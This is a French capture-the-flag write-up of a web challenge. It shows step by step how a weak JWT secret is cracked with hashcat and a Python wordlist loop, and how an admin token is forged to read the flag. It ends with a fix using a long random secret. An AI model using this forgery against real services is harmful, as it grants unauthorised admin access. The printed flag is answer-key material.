# Writeup — JWT Forgery

**Catégorie** : Web  
**Difficulté** : Hard  
**Points** : 300  
**Flag** : `CTF{jwt_weak_secret_cracked}`

## Contexte

Les JSON Web Tokens (JWT) sont signés avec un secret. Si ce secret est faible (mot du dictionnaire), il peut être cracké par brute-force, permettant de forger des tokens avec des claims arbitraires.

## Étapes de résolution

### 1. Obtenir un token guest

```bash
curl -s -X POST http://TARGET:5035/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"guest","password":"guest"}'
```

Réponse : `{"token": "eyJ...", "role": "guest"}`

### 2. Décoder le token (sans vérification)

```python
import jwt, base64, json

token = "eyJ..."
# Décoder sans vérification pour voir le payload
header, payload, _ = token.split(".")
print(json.loads(base64.b64decode(payload + "==")))
# {'user': 'guest', 'role': 'guest'}
```

### 3. Cracker le secret

**Avec hashcat** :
```bash
hashcat -a 0 -m 16500 eyJ... /usr/share/wordlists/rockyou.txt
```

**Avec Python (bruteforce simple)** :
```python
import jwt

token = "eyJ..."
for word in ["secret", "secret123", "password", "admin", "key"]:
    try:
        jwt.decode(token, word, algorithms=["HS256"])
        print(f"[+] Secret found: {word}")
        break
    except jwt.InvalidSignatureError:
        pass
```

Le secret est : `secret123`

### 4. Forger un token admin

```python
import jwt

forged = jwt.encode({"user": "admin", "role": "admin"}, "secret123", algorithm="HS256")
print(forged)
```

### 5. Accéder au flag

```bash
curl -s http://TARGET:5035/api/flag \
  -H "Authorization: Bearer <FORGED_TOKEN>"
```

**Résultat** : `{"flag": "CTF{jwt_weak_secret_cracked}", "user": "admin"}`

## Correction

Utiliser un secret aléatoire long (≥ 256 bits) et le stocker dans les variables d'environnement :
```python
import secrets
JWT_SECRET = secrets.token_hex(32)  # 64 caractères hex
```
Ne jamais utiliser un mot du dictionnaire comme secret JWT.
